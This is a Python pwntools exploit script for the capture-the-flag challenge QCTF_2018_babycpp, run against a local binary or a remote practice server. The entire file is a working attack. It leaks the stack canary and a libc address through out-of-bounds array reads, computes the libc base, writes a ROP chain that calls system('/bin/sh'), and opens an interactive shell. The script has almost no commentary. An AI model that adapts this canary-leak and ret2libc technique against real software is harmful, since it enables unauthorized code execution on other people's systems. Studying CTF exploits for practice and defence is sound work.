import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./QCTF_2018_babycpp')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./QCTF_2018_babycpp')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',28126)
			elf=ELF('./QCTF_2018_babycpp')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		io.recv()
		io.sendline('22')
		io.recv()
		io.sendline('2')
		io.recv()
		for i in range(22) :
			io.sendline('1')
		io.recv()
		io.sendline('1')
		io.sendline('28')
		io.recv()
		io.sendline('3')
		io.recv(2)
		data1=int(io.recvuntil(' ',drop=True))
		data2=int(io.recvuntil(' ',drop=True))
		io.recvuntil(' 0 ')
		print hex(data1)
		print hex(data2)
		data3=int(io.recvuntil(' ',drop=True))
		data4=int(io.recvuntil(' ',drop=True))
		if data3 < 0 :
			data3=0x100000000+data3
		libc_base=data3+(data4<<32)-libc.sym['__libc_start_main']-231
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		# if data < 0 :
		# 	data=0x100000000+data
		# if data1 < 0 :
		# 	data1=0x100000000+data
		io.recv()
		io.sendline('1')
		io.sendline('38')
		pop_rdi1=0x00401253
		pop_rdi2=0
		io.recv()
		io.sendline('2')
		io.recv()
		for i in range(22) :
			io.sendline(str(i))
		io.sendline(str(data1))
		io.sendline(str(data2))
		io.sendline(str(0))
		io.sendline(str(0))
		io.sendline(str(0x0000000000401251))
		io.sendline(str(0))
		io.sendline(str(0))
		io.sendline(str(0))
		io.sendline(str(0))
		io.sendline(str(0))
		io.sendline(str(pop_rdi1))
		io.sendline(str(pop_rdi2))
		io.sendline(str(bin_sh_addr&0xffffffff))
		io.sendline(str(bin_sh_addr>>32))
		io.sendline(str(system_addr&0xffffffff))
		io.sendline(str(system_addr>>32))
		io.recv()
		io.sendline(str(4))





		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue